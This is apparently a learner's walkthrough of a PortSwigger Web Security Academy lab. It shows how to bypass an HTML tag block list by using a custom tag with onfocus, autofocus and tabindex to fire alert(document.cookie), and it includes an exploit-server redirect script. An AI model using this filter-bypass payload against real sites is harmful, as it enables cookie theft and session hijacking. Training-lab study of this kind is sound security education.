https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.





1) try to inject <b> into the search input
    we receive the message "Tag is not allowed"

2) maybe there are some allowed tags, so fuzz the b into the <b> with the tags we can found here: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

    we can see that the <custom tag> are allowed

    so we need to create a personal tag

3) try to inject:
    <custom id = a onfocus=alert(document.cookie) autofocus tabindex=1 >

    autofocus is used to assign automatically the focus to this tag

    we cound use also this 
    <custom id = a onfocus=alert(document.cookie) tabindex=1 >#a
    in order to focus on the tag that has id= a

    so this URL triggers an alert : https://lab_id.web-security-academy.net/?search=<custom id=a onfocus=alert(document.cookie)  autofocus tabindex=1 >

4) create the exploit for the fictim in the exploit server


    <script>
           document.location = "https://lab_id.web-security-academy.net/?search=<custom id=a onfocus=alert(document.cookie)  autofocus tabindex=1 >"
    </script>
